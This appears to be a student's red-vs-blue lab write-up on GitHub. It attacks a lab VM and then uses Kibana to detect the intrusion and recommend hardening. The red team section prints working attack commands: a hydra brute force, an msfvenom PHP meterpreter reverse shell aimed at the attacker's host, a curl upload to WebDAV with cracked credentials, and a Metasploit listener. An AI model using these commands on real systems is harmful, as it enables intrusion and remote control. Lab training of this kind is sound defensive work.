# Red vs Blue Team Project
 
 ## Network Diagram
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/RedVsBlue.png)
 
 
# **RED TEAM - Penetration Test**


As the Red Team, I gone through the five stages of the Pentesting. I attacked a vulnerable Capstone VM within my environment, ultimately gaining root access to the machine. Entire attack was conducted using the Kali Machine.

The five pentesting stages:

- Planning and Reconnaissance
- Scanning
- Exploitation
- Post Exploitation
- Reporting

## Stage 1 Planning and Reconnaissance

### **Discover IP address of Linux web server:**
I used the command ``ip a`` to know the ip subnet.
```
ip a
```
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%201.png)


I used the ``netdiscover -r <subnet ip>`` command to discover the target ip. The subnet ip was ``192.168.1.0/24``.
```
netdiscover -r 192.168.1.0/24
```
#### **Following is the output:**
 
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%202.png)
 
 I got the ip details of all the machines on the subnet.
 
| IP | Machine |
|:-------------:|:-------------:|
| 192.168.1.1 | Hyper-V, Gateway IP |
| 192.168.1.90 | kali Machine |
| 192.168.1.105 | Capstone, target machine |
| 192.168.1.100 | ELK server |

Capstone machine had an ip of 192.168.1.105.
 
##Stage 2 Scanning 

### **Navigating the Webserver:**
 
  #### **Service and Version Scan:**

I used the nmap -sV -v 192.168.1.105 command to do a service and version scan on the webserver. 
 
-sV: Probes open ports to determine service and version info.
 
```
nmap -sV -v 192.168.1.105
```
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%203.png)
 
 That revealed the open ports on the webserver.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%204.png)
 
| Port | Service | Version |
|:--:|:--:|:--:|
| Port 22 | SSH | OpenSSH 7.6p1 |
| Port 80 | HTTP | Apache httpd 2.4.29 |
 
  #### **Locate the hidden directory on the Webserver:**

 I opened the webbrowser on the attacker machine(Kali) and accessed the webserver using  its  ip **192.168.1.105**.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%205.png)

 Navigating through the various folders, in the _company folders_ directory, I noticed the  reference to a &quot;_secret\_folder_&quot; in ALL documents within this directory,  which implies there was a folder called &quot;_secret\_folder_&quot; that I need to target.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%207.png)
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%208.png)
 
 Navigating through the _meet\_our\_team_ folder confirms there are three users, whose credentilas can be used to log on.
 
 Each text file had a references to the _secret\_folder:_
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%209.png)

 Navigating through the _company\_blog_ folder confirms there were three users, whose credentilas can be used to log on.
 
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%206.png)

To get an access to the &quot;_secret\_folder_&quot;, I tried entering the following url:
 
```
192.168.1.0.5/company_folders/secret_folder
```
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2010.png)
 
I need a password to gain access to the &quot;_secret\_folder_&quot;. To get the password I Brute forced the password.
 
  #### **Brute Force the password:**
 
I downloaded the **rockyou.txt** file. 
 
![alt-text]( https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Imagerockyou.png)
 
 and used the **hydra** command to Brute Force the password.
 
```
hydra -l ashton -P ./root/Downloads/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/ashtonpsswd.png)
 
 Found the following login credentials for the user ``ashton``:
 

| Username | Passwd| 
|:--:|:--:|
| ashton| leopoldo | 
 
 ### **Cracking the Password :**

I logged in the webserver using the above credentials. And gained access to the &quot;_secret\_folder_&quot;
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2011.png)
 
 Opening the connect &quot;_connect\_to\_corporate\_folder_&quot; displayed the following information.
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2012.png)
 
 This file had **CEO Ryan's** hashed password.And instructions to connect to the companies webdav server.
 
 I used **Crack Station** to crack Ryan's hashed password.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2015.png)
 
 Got following credentials for Ryan.
 
 | Username | Passwd| 
|:--:|:--:|
| ryan| linux4u | 
 
 ### **Connect to WebDav server:**
 
 Followed the instructions to connect to the webdav server, using Ryan's credential.
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2016.png)
 
 There was a file called **passwddav** with the following contents: 
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2017.png)
  
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2018.png)

##Stage 3 Exploitation

 ### **PHP Reverse Shell payload:**
 
#### **Msfvenom**

I used **MSVenom** to upload a PHP reverse shell payload using the following command. Since 

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
```

Using msfvenom we created a payload – shell.php
 
 ### **Upload the Payload on webdav**
 
 I used the curl command and login credentials of user Ryan to upload the payload on webdav server. 
 
 ```
 curl http://192.168.1.105/webdav/shell.php -u ryan:linux4u --upload-file shell.php
 
 ```
 The shell.php payload gets loaded on to the webdav directory of the server.
 
![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2019.png)
  
#### **Metasploit-Setting up a Listener**
 
 Once the payload is uploaded, its time to set up a listener on our Kali machine. I used Metasploit for this task. Metasploit is a tool suite (a program comprised of multiple tools) for hacking servers and other networked devices. The main tools I used for this task are:

- MSFconsole: The main interface for Metasploit. Offers a centralized console to access all the options and modules. MSFconsole runs on our local machine.
- Meterpreter: A Linux-style shell that Metasploit launches once I successfully break into a target machine. Meterpreter runs on the compromised machine, not on the local machine.

To reiterate, I used  **MSFconsole** to find vulnerable machines and gain access to it. Once I exploited them, I used Meterpreter on the compromised machine.
 
 Start Metasploit by running the following command:

 
 ```
msfconsole

```

This command will launch Metasploit's command-line interface.

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2022.png)
 
 Set the following fields once we get msf command prompt:
 
 - use multi/handler
 - set lhost 192.168.1.90 (lhost is local host. It is an ip of our local machine(kali machine)).
 - set lport 4444
 - set payload php/meterpreter/reverse_tcp
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2023.png)
 
 After successfully setting the fields, we can run the exploit.
  
 - Run either ``run or exploit``.
  
    
 After loading the exploit and activating the shell.php I uploaded earlier by clicking on **shell.php** on the webserver, the target server connected to the listener and launched a meterpreter session on to the compromised system.

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2021.png)
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2026.png)
 
##Stage 4 Post Exploitation

### **Finding the Flag**
 
 Meterpreter is on the target machine so I got an access to the machine and I used the following command to locate the **Flag1**
 
- cd /
 - ls -la
 
 It listed all the files in the root home directory.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2027.png)
 
 ### **Flag**

Then I used the ``cat flag.txt`` command to read the contents of the flag.txt file.
 
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2028.png)

 
 Finally downloaded the flag.txt file on kali machine.
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Image%2030.png)

 
 # **BLUE TEAM - SOC Analyst**
 
 ## **Incident Analysis with Kibana**
 
### Identify the offensive traffic.
#### Nmap scan.

For nmap scan  between my machine and the web machine, following query was entered in Kibana:

```
source.ip:192.168.1.90 AND destination.ip: 192.168.1.105 AND user_agent.original :"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 
```

 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Nmap.png)
 
 - The  interaction occured at ``09:00 on July 12, 2021``

 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/q1.3.png)
  
  - The data is concerning from the Blue Team perspective is 
 

### The request for the hidden directory. ###


 To look at the interaction between these two machines, when attack happened and secret folder was found following command was executed:
```
source.ip:192.168.1.90 AND destination.ip: 192.168.1.105 AND url.path:"/company_folders/secret_folder"    AND http.request.method: "get" AND http.response.status_code :401

```
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/HiddenDirectory..png)
 
  ```
source.ip:192.168.1.90 AND destination.ip: 192.168.1.105 AND url.path:"/company_folders/secret_folder"  AND http.response.status_code :200

```
 ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/Successsecretfolder.png)
 


- There was `secret_folder`inside the company_folder that contained instructions to access the `webdav server` using CEO Ryan's credentials. Password also had hashed password, which I cracked using Crack station. 
- For these type of activities where the attacker tries to attack a hidden directory setting following alarms an mitigation strategies are recommended:
 - #### Alarm 
 
         - Set an alarm if there is an excessive amount of traffic to the hidden directory.
         - Any sudden surge in traffic requesting hidden file should be alarming.
         - Set an alarm if an unknown IP address is trying to access the hidden directory.


  - #### System Hardening
  
         - Turn off the directory listing.
         - Remove the directory and file from the server and move it to some safe or offline location. 
         - Remove all reference to this secret directory. 
         - Create multi-factor authentication for all priviliged accounts.
         - No password to be saved in the hashed format, add salt to the hashed password.

### Identify the Brute Force Attack.

 The brute force attack was conducted using `` Hydra``
 To identify the brute force attack, following query was used in the Kibana:
 
 ``` source.ip : 192.168.1.90 AND url.path: "/company_folders/secret_folder" AND user_agent.original : "Mozilla/4.0 (Hydra)" ```
 
  ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/d3hydra.png)
   
   There are 16,074  packets identified from ``Hydra``
   
   
   
   ![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/d3hydra2.png)
 
- In the brute force attack 16,074 attempts were made.
- Out of 16,074 attempts, 1 last one was successful.
 
 Following query on the kibana returns the required result:
 
``` source.ip : 192.168.1.90 AND url.path: "/company_folders/secret_folder" AND user_agent.original : "Mozilla/4.0 (Hydra)"  ```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/d3bfattack.png)
 

#### For these type of activities where the attacker tries to brute force the password, following alarms an mitigation strategies are recommended:
 - - #### Alarm 
 
         - Set a critical alert if the user_agent.original value includes 'Hydra'.
         - Set a critical alert in case any server returns '401 Unauthorized'. 
         - Set a low level alarm for more than 3 password failures.
         - Set a critical alarm for more than 5 password failures. 

- - #### System Hardening
  
         - Drop the traffic from the IP address for a period of 1 hr that causes a server to return '401 Unauthorized', after the limit of 5 attempts.
         - Black list the IP that has a request containing 'Hydra'  in user_agent.original'. 
         - Create multi-factor authentication for all priviliged accounts.
         - Lock out the user attempting to send such requests.
         - Set up fail2ban.conf and jail.conf files found in /etc folder.


### WebDav connection.

```source.ip : 192.168.1.90 AND url.path: "/webdav" ```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/d3webdav.png)

- Total 7 requests were made to the webdav folder.

```source.ip : 192.168.1.90 AND url.path: "/webdav/shell.php" ```

- To listen for the activities on the victim machine, the shell.php file was requested.
- Total of 2 requests were made to shell.php file.

```source.ip : 192.168.1.90 AND url.path: "/webdav/shell.php"  AND http.response.status_code: 201```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/d3webdavshell.png)

#### For these type of activities where the attacker tries to access the webdav server, following alarms an mitigation strategies are recommended:
 - - #### Alarm 
 
         - Set an  alert in case any unauthorized machine/IP tries to access to the webserver.
         - Set an alert any user access the web server.
         - Set a threshold to 1 for this alert. 
         - Set an  alert in case of any outbound traffic from the server.

- - #### System Hardening
  
         - Disable weddav on the server.
         - This folder should not be accessible via webinterface.
         - Configure firewall to restrict the access to this folder.
               - Add an access list of IP’s , users and devices.
               - Add a rule to block unknown Ip’s and users.
         - All the files that have description of this folder should be moved to safer location and should be encrypted.
         - Add a strong password and enforce multi factor authentication to access this server.

###  Identify the reverse shell and meterpreter traffic.

Since the listener is set on our machine, our machine will become destination and the victim machine will become source. Hence the query that will use on Kibana to interpret meterpreter traffic is:

```source.ip : 192.168.1.105 AND destination.ip: 192.168.1.90 AND destination.port:4444```

![alt-text](https://github.com/Reeti4cyber/Red-vs-Blue-Team-Project/blob/main/Images/meterpreter.png)

#### For these type of activities where the reverse shell is uploaded, following alarms an mitigation strategies are recommended:
 - - #### Alarm 
                 
         - Set an alert for any file that contains suspicious or malicious code.
         - Set an alarm if any file is created or uploaded on the server.
         - Set an alarm if any file with extension .php is detected or any the script is detected.
         - Set an alarm if any new outbound connection to a new port is detected.


- - #### System Hardening
  
         - Screen all incoming traffic.
         - Restrict uploading .php files.
         - Setup automatic updates.
         - Create add/ deny list for IPs trying to     access port 4444.
         - Add a rule to firewall to block traffic on any port from the tools such as Meterpreter. 


         


